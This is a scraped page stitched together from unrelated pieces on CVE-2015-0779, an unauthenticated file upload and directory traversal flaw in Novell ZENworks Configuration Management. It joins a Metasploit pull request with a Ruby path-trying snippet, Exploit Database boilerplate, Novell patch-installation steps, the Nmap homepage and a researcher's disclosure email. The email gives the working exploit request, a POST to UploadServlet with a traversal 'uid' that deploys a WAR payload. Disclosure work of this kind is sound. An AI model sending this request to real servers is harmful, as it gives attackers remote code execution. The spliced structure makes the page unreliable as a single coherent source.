### @pedrib **[pedrib](/pedrib)** commented [Apr 7, 2015](#issue-66911076)

This is an exploit for [CVE-2015-0779](https://github.com/advisories/GHSA-49r7-w8p8-xgc3 "CVE-2015-0779"), a file upload vulnerability in ZenWorks Configuration Management up to and including 11.3.1.

This exploit works in Windows, Linux and the Virtual Appliance which can be downloaded from Novell's website. It has been extensively tested on all platforms.

I'll add the full disclosure and OSVDB links once they become available, but otherwise it is ready to go on my side.

Sorry, something went wrong.

I feel like it should be something like:

```
tomcat_paths = []
if datastore['TOMCAT_PATH']
  tomcat_paths << datastore['TOMCAT_PATH']
end
tomcat_paths.concat([ '../../../opt/novell/zenworks/share/tomcat/webapps/', '../webapps/' ])

tomcat_paths.each do |tomcat_path|
  upload_war_and_exec(tomcat_path)
  break if session_created?
end
```

      'Description' => %q{
        This module exploits a file upload vulnerability in Novell ZENworks Configuration
        Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in
        the UploadServlet which accepts unauthenticated file uploads and does not check the
        "uid" parameter for directory traversal characters. This allows an attacker to write
        anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat
        webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack.
        This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note
        that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a
        Metasploit exploit, but it abuses a different parameter of the same servlet.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Additional Information

 See the update readme  <https://download.novell.com/Download?buildid=l3sAaQ2eGb8~> for compatibility, new features, reboot behavior and known limitations.

**System Requirements:**
ZENworks Configuration Management 11 SP3 or higher. After downloading the zip file, it is strongly recommended that you compare the MD5 checksum for the file with the one shown on the Novell Downloads page, before attempting to deploy.

Do not deploy this update until all Primary Servers and Satellites in the zone have been upgraded to ZENworks 11 SP3.

This update requires schema changes to be made to the database. As such, only one primary server should have its services running during the initial patch installation so that other primaries are not trying to access the tables being changed in the database.

After the first Master Primary or dedicated server has been updated, the remaining servers can restart their services and apply the update simultaneously.

For agents that are ZENworks 10.3.4 or later, this update is cumulative and when deployed will update the agents directly to the Update for ZENworks 11 SP3 (11.3.2).

**Installation**Importing the UpdateDownload *ZENworks\_11.3.2\_Update.zip* from this update.

1. Copy the zip file to one of the ZENworks servers in the Zone. **(if System Update is configured to use a “Dedicated System Update Server”, use this server for the import)**. Do not unzip the file.

   For example:
   On Linux, copy the zip file to */tmp*On Windows, copy the zip file to *%ZENWORKS\_HOME%*
2. Using a command prompt on the ZENworks server where you copied the zip file in step 1, run the command  *zman sui* [path to zip file]For details, run the command  *zman sui --help*

   For example on Windows:
   *zman sui "C:\Program Files\Novell\ZENworks\ZENworks\_11.3.2\_Update.zip"*
   For example on Linux:  *zman sui /tmp/ZENworks\_11.3.2\_Update.zip*
3. The *zman sui* command should report: "*The update(s) contained in "*[path to file]*" ZENworks\_11.3.2\_Update.zip will begin importing shortly. You may use ZCC to track the status of your import*".
4. In ZENworks Control Center, navigate to *Configuration* > *System Updates and* monitor the status of "*Update for ZENworks 11 SP3 (11.3.2)*", until it shows "*Downloaded*"
5. After the Update is imported, it needs to replicate to all content servers.  This replication can be tracked by navigating to Update for ZENworks 11 SP3 (11.3.2)> Replication Status.
6. Continue Deployment AFTER replication is 100% on all content servers.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

Hi,

I've found a reported an unrestricted file upload vulnerability in
Novell ZenWorks Configuration Management which can be abused to
achieve remote code execution.

The full advisory text is below, and can also be obtained from my repo
[1]. A Metasploit module has been submitted and should hopefully be
accepted soon [2].

Regards,
Pedro

This vulnerability is present in ZENworks Configuration Management
(ZCM) which is part of the ZENworks Suite.
A blast from the past? This is a similar vulnerability to ZDI-10-078 /
OSVDB-63412, but it abuses a different parameter of the same servlet.
However this time Novell:
- Did not bother issuing a security advisory to their customers.
- Did not credit me even though I did responsible disclosure.
- Refused to provide a CVE number for months.
- Did not update their ZENworks Suite Trial software with the fix (you
can download it now from their site, install and test the PoC /
Metasploit module).
- Does not list the fix in the ZCM 11.3.2 update information
(<https://www.novell.com/support/kb/doc.php?id=7015776>).

```

```
Vulnerability: Remote code execution via file upload and directory traversal
CVE-2015-0779
Constraints: none; no authentication or any other information needed
Affected versions: ZENworks Configuration Management 11.3.1 and below

POST /zenworks/UploadServlet?uid=../../../opt/novell/zenworks/share/tomcat/webapps/&filename=payload.war
<WAR file payload in the body>

The WAR file will be automatically deployed to the server (on certain
Windows and Linux installations the path can be "../webapps/"). A
Metasploit module that exploits this vulnerability has been released.

```
